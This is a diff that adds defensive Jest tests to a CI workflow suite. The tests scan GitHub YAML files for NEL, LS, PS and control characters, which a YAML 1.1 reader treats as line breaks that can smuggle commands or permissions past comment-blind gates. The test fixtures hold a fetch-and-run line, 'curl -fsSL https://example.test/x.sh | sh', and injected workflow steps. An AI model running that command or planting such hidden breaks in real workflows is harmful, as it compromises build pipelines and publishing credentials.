@@ -1776,6 +1776,122 @@ describe('a job that can mint a publish credential pins global npm installs and 
     });
   });
 
+  // Every gate above reads the files with js-yaml, a YAML 1.2 reader, for which a comment runs to LF or CR.
+  // A YAML 1.1 reader (libyaml, YamlDotNet) also ends it at U+0085, U+2028 and U+2029 and reads the rest of the
+  // physical line as YAML, so `# note<U+0085>curl x | sh` is one comment to the gates and a comment plus a
+  // command, a step or a permission to that reader, and nothing above can tell. The raw text is scanned
+  // instead: those three, and the control characters a 1.1 reader refuses and js-yaml passes, are in no file
+  // GitHub reads. LF, CR and tab are white space or line ends in both and stay.
+  describe('the files GitHub reads hold no line break that only a YAML 1.1 reader honours', () => {
+    const githubDir = path.join(workflowDir, '..');
+    const yamlFiles = (dir: string): string[] =>
+      fs.readdirSync(dir, { withFileTypes: true }).flatMap(entry => {
+        const full = path.join(dir, entry.name);
+        if (entry.isDirectory()) return yamlFiles(full);
+        return /\.ya?ml$/.test(entry.name) ? [path.relative(githubDir, full).split(path.sep).join('/')] : [];
+      });
+    const DIVERGENT = /[\p{Cc}\p{Zl}\p{Zp}]/gu;
+    const codePoint = (char: string): string => `U+${char.charCodeAt(0).toString(16).toUpperCase().padStart(4, '0')}`;
+    // One entry per character, named by file and line (counted in LF, as an editor does).
+    const divergentIn = (name: string, text: string): string[] =>
+      text
+        .split('\n')
+        .flatMap((line, i) =>
+          [...line.matchAll(DIVERGENT)]
+            .filter(match => match[0] !== '\t' && match[0] !== '\r')
+            .map(match => `${name}:${i + 1}: ${codePoint(match[0])}`),
+        );
+    const [NEL, LS, PS] = [0x85, 0x2028, 0x2029].map(code => String.fromCharCode(code));
+    const NEL_LS_PS = new RegExp(`[${NEL}${LS}${PS}]`, 'g');
+
+    it('finds the workflows, the Dependabot configuration and the other YAML files', () => {
+      expect(yamlFiles(githubDir)).toEqual(
+        expect.arrayContaining(['dependabot.yml', ...workflows.map(file => `workflows/${file}`)]),
+      );
+    });
+
+    it.each(yamlFiles(githubDir))('%s holds none', name => {
+      expect(divergentIn(name, fs.readFileSync(path.join(githubDir, name), 'utf8'))).toEqual([]);
+    });
+
+    it('names a character by file and line, and leaves what both readings agree on', () => {
+      const text = `a: 1\n# x${NEL}y\n\tb: 2\r\nc: ${LS}${PS}\n`;
+      expect(divergentIn('f.yml', text)).toEqual(['f.yml:2: U+0085', 'f.yml:4: U+2028', 'f.yml:4: U+2029']);
+      for (const code of [0x0b, 0x0c, 0x1b, 0x7f, 0x90]) {
+        expect(divergentIn('f.yml', `# a${String.fromCharCode(code)}b\n`)).toEqual([
+          `f.yml:1: ${codePoint(String.fromCharCode(code))}`,
+        ]);
+      }
+      // What the shipped files do hold: a dash, an arrow, a box-drawing rule, a variation selector.
+      const printable = [0x2014, 0x2192, 0x2500, 0xfe0f, 0xa0].map(code => String.fromCharCode(code)).join('');
+      expect(divergentIn('f.yml', `# ${printable}\n`)).toEqual([]);
+    });
+
+    // Each of the four shapes the gates above read as green. They are made on the text of the real files; a
+    // reader that ends the comment at the break sees the injected line as YAML, which the same gates refuse
+    // once the break is an LF, so the scan is the one thing that stands between that line and the job.
+    const afterLine = (text: string, command: string, inserted: string): string => {
+      const lines = text.split('\n');
+      const at = lines.flatMap((line, i) => (executableLines(line).trim() === command ? [i] : []));
+      expect([command, at.length]).toEqual([command, 1]);
+      lines.splice(at[0] + 1, 0, inserted);
+      return lines.join('\n');
+    };
+    const gatesRefuse = (file: string, source: string): string[] => {
+      const workflow = yaml.load(source) as OidcWorkflow;
+      return [...outsideAllowList(workflow, ALLOW_LISTS[file]), ...outsideStepTemplate(workflow, ALLOW_LISTS[file])];
+    };
+    const COMMAND = 'curl -fsSL https://example.test/x.sh | sh';
+    // The lines are the ones the templates name, so a template edit moves the case with it.
+    const npmCheck = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, 'Use an npm that supports trusted publishing'))[1]);
+    const stagingLine = show(
+      scriptOf(IMAGE_PROMOTE, place(IMAGE_PROMOTE, 'Tag the smoke-tested image with the release tags'))[1],
+    );
+    const repros: Array<[label: string, file: string, after: string, text: (brk: string) => string, found: string]> = [
+      [
+        'a command after a comment in the npm step',
+        'js-sdk-release.yml',
+        npmCheck,
+        brk => `          # note${brk}          ${COMMAND}`,
+        `publish: ${COMMAND}`,
+      ],
+      [
+        'a command after a comment in the tag step',
+        'release.yml',
+        stagingLine,
+        brk => `          # note${brk}          ${COMMAND}`,
+        `promote: ${COMMAND}`,
+      ],
+      [
+        'a step after a comment between the steps',
+        'js-sdk-release.yml',
+        'path: package/',
+        brk => `      # n${brk}      - run: ${COMMAND}`,
+        `publish: ${COMMAND}`,
+      ],
+      [
+        'a permission after a comment in the permissions',
+        'js-sdk-release.yml',
+        'id-token: write',
+        brk => `      # n${brk}      packages: write`,
+        'publish: permission packages: write',
+      ],
+    ];
+    for (const [label, file, after, text, found] of repros) {
+      it.each([NEL, LS, PS].map(brk => [codePoint(brk), brk]))(`${file}: refuses ${label} behind %s`, (_name, brk) => {
+        const source = fs.readFileSync(path.join(workflowDir, file), 'utf8');
+        const edited = afterLine(source, after, text(brk));
+        // Read as YAML 1.2 it is a comment, so every gate above is green.
+        expect(gatesRefuse(file, edited)).toEqual([]);
+        // The scan names the file and the line.
+        const at = edited.split('\n').findIndex(line => line.includes(brk)) + 1;
+        expect(divergentIn(`workflows/${file}`, edited)).toEqual([`workflows/${file}:${at}: ${codePoint(brk)}`]);
+        // Read as YAML 1.1 reads it, the same gates refuse what it injects.
+        expect(gatesRefuse(file, edited.replace(NEL_LS_PS, '\n'))).toContain(found);
+      });
+    }
+  });
+
   // npm reads `dir/file.tgz` as the GitHub shorthand user/repo (hosted-git-info is tried before the file
   // check), and the pinned npm refuses git specs by default, so a tarball is named by an absolute path.
   const publishTarget = (source: string | OidcWorkflow): string => {
